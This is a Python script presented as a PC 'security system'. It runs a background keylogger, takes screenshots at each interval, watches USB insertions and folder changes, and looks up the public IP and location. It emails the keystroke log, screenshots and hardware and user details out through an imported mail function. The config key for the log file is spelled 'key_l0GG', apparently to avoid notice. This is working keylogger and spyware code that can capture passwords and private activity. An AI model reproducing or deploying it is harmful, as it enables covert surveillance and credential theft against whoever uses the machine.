import os
import configparser
import time
import socket
import platform
import subprocess
import getpass
import psutil
import requests
import smtplib
import subprocess
import re
from email.mime.text import MIMEText
from datetime import datetime
from config import *
import pyautogui
from emails import *

from pynput.keyboard import Key, Listener

#CHECK_INTERVAL = 20  # seconds


CHECK_INTERVAL = int(get_config_val('check_interval'))
DEVICE_NAME = socket.gethostname()


WATCH_FOLDERS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    r"D:\OfficeData"
]

LOG_FILE = get_config_val('log_file_path')

# ---------- Main Calling Function START----------

# ---------- MAIN SECURITY ----------
def start_security():
    print("Security system started...")
    # Starting the keylogger
    #with Listener(on_press=write_to_file, on_release=on_release) as listener:
    #    listener.join()
    # 1. Start the keylogger in a non-blocking way
    listener = Listener(on_press=write_to_file, on_release=on_release)
    listener.start()  # This starts the thread but allows code execution to continue

    
    base_ip, base_city, base_country = login_alert()
    usb_baseline = get_usb()
    folder_state = {f: snapshot(f) for f in WATCH_FOLDERS}
    while True:
        time.sleep(CHECK_INTERVAL)

        # Take Screen Shot After Every Interval
        take_ss(True)
        # USB change
        current_usb = get_usb()
        if current_usb != usb_baseline:
            prepare_email_context("⚠️ USB INSERTED", f"USB devices changed:\n{current_usb}")
            usb_baseline = current_usb
        # File changes
        for folder in WATCH_FOLDERS:
            new_state = snapshot(folder)
            if new_state != folder_state[folder]:
                prepare_email_context("⚠️ FILE CHANGE DETECTED", f"Changes in folder:\n{folder}")
                folder_state[folder] = new_state
        # Network/location change
        try:
            public_ip = requests.get("https://api.ipify.org", timeout=5).text
            geo = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=5).json()
            city = geo.get("city")
            country = geo.get("country")

            if public_ip != base_ip:
                msg = f"Network changed!\nNew IP: {public_ip}\nLocation: {city}, {country}"
                prepare_email_context("🌍 NETWORK CHANGE ALERT", msg)
                base_ip = public_ip

        except:
            pass
# ---------- Main Calling Function END  ----------

# ---------- SYSTEM INFO START ----------
def system_info():
    data = {}

    # manufacturer
    try:
        output = subprocess.check_output("wmic computersystem get manufacturer", shell=True).decode()
        data["manufacturer"] = output.strip().replace("Manufacturer  ", "")
        data["manufacturer"] = data["manufacturer"].replace("\r\r\n", "")
        #data["manufacturer"] = data["System"].replace("               \r\r", "")
    except:
        pass

    # model
    try:
        output = subprocess.check_output("wmic computersystem get model", shell=True).decode()
        data["model"] = output.strip().replace("Model ", "")
        data["model"] = data["model"].replace("               \r\r\n", "")
    except:
        pass

    # serial
    try:
        serial = subprocess.check_output("wmic bios get serialnumber", shell=True).decode()
        data["Serial_Number"] = serial.strip().replace("SerialNumber ", "")
        data["Serial_Number"] = data["Serial_Number"].replace(" \r\r\n", "")
    except:
        pass

    # SYSTEM RAM (MEMORY)

    try:
        # Get memory statistics as a named tuple
        data["RAM"] = round( (psutil.virtual_memory().total / (1024**3)), 2)+ " (GB)" # IN GB's
    except:
        pass
    try:
        data['System_Type'] = get_hardware_type()
    except:
        data['System_Type'] = "N/A"

    
    data['User'] = getpass.getuser()
    data['PC Name'] = socket.gethostname()
    data['OS_Type'] = platform.system()
    data['OS'] = platform.system() + " " + platform.release()
    data['Time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        data['Local IP'] = socket.gethostbyname(socket.gethostname())
    except:
        data['Local IP'] = "N/A"

    try:
        public_ip = requests.get("https://api.ipify.org", timeout=5).text
        data['Public IP'] = public_ip
        geo = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=5).json()
        data['City'] = geo.get("city")
        data['Country'] = geo.get("country")
        data['ISP'] = geo.get("isp")
    except:
        data['Public IP'] = "No internet"
    return data

# ---------- SYSTEM INFO END ----------

# ---------- GET HARDWARE TYPE START ----------
def get_hardware_type():
    try:
        # Command for Linux systems (requires systemd or dmidecode permissions)
        if platform.system() == "Linux":
            # Try hostnamectl first (requires systemd)
            try:
                machine_info = subprocess.check_output(["hostnamectl", "status"], universal_newlines=True)
                m = re.search(r'Chassis: (.+?)\n', machine_info)
                if m:
                    return m.group(1).strip()
            except (FileNotFoundError, subprocess.CalledProcessError):
                pass # Fallback to dmidecode
            
            # Fallback for systems without hostnamectl/systemd
            # Requires root privileges to run dmidecode
            try:
                chassis_type = subprocess.check_output(["sudo", "dmidecode", "-s", "chassis-type"], universal_newlines=True).strip()
                if chassis_type:
                    return chassis_type
            except (FileNotFoundError, subprocess.CalledProcessError):
                pass
        
        # Command for Windows systems (using PowerShell and WMI/CIM)
        elif platform.system() == "Windows":
            # Use PowerShell to get PCSystemType
            ps_command = "(Get-CimInstance Win32_ComputerSystem).PCSystemType"
            output = subprocess.check_output(["powershell", "-Command", ps_command], universal_newlines=True).strip()
            # PCSystemType 1 is Desktop, 2 is Mobile/Laptop
            if output == '1':
                return 'Desktop'
            elif output == '2':
                return 'Laptop'
            else:
                return 'Other/Unknown (PCSystemType ' + output + ')'

        # For macOS or other systems, specific commands would be needed.
        return "Unknown OS or method not implemented"
        
    except Exception as e:
        return f"Error: {e}"
# ---------- GET HARDWARE TYPE END ----------

# ---------- LOG FUNCTION ----------
def write_log(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text + "\n")



# ---------- LOGIN ALERT ----------
def login_alert():
    prepare_email_context("🚨 PC LOGIN ALERT", "🚨 LOGIN DETECTED ON YOUR COMPUTER 🚨\n\n")
    info = system_info()
    return info.get("Public IP"), info.get("City"), info.get("Country")
# ---------- USB DETECTION ----------
def get_usb():
    drives = []
    for p in psutil.disk_partitions():
        if 'removable' in p.opts:
            drives.append(p.device)
    return set(drives)

# ---------- FILE SNAPSHOT ----------
def snapshot(folder):
    state = {}
    for root, dirs, files in os.walk(folder):
        for f in files:
            path = os.path.join(root, f)
            try:
                state[path] = os.path.getmtime(path)
            except:
                pass
    return state
# ---------- PREPARE EMAIL CONTEXT ----------
def prepare_email_context(subject, body, attachment=None):
    subject = f"[{DEVICE_NAME}] {subject}"
    body = body + "-------------------\n\n"

     # Create a list for multiple attachments
    attachments_list = []
    
    # Add the primary attachment (Screenshot)
    if attachment:    
        attachments_list.append(attachment)
    else:
        attachments_list.append(take_ss()) # Automatically take SS if none provided
    
    # Add the keylogger log file
    attachments_list.append(get_config_val('key_l0GG_file_path'))
        
    info = system_info()
    for k,v in info.items():
        body += f"{k}: {v}\n"
    send_email(subject, body, attachments_list)

    write_log(subject + " | " + body)
    
# ---------- TAKE SCREENSHOT ----------

def take_ss(email_ss=None):
    # 1. Setup paths
    #folder_name = "assets/screenshots/"

    folder_name = get_config_val('screen_shots_path')
    
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot_{timestamp}.png"
    
    # Use os.path.join for cross-platform compatibility (Windows/Linux)
    full_path = os.path.join(folder_name, filename)

    try:
        # 2. Ensure the directory exists
        os.makedirs(folder_name, exist_ok=True)

        # 3. Attempt the screenshot
        pyautogui.screenshot(full_path)
        print(f"✔ Screenshot saved: {full_path}")

        # 4. Handle email context
        if email_ss:
            # Pass the full_path so the email function can find the file
            prepare_email_context("INTERVAL Screenshot", "INTERVAL screenshot was captured", full_path)
        
        return full_path

    except Exception as e:
        print(f"✘ Screenshot failed: {e}")
        return None



# Function to write captured keys to a file
def write_to_file(key):
    key_data = str(key).replace("'", "")
    K_LOG_FILE = get_config_val('key_l0GG_file_path')
    
    # Format special keys for readability
    if key_data == 'Key.space':
        key_data = ' '
    elif key_data == 'Key.enter':
        key_data = '\n'
    elif 'Key' in key_data:
        key_data = f' [{key_data}] '


    with open(K_LOG_FILE, "a") as f:
        f.write(key_data)

# Function to stop the listener (optional)
def on_release(key):
    if key == Key.esc:
        return False


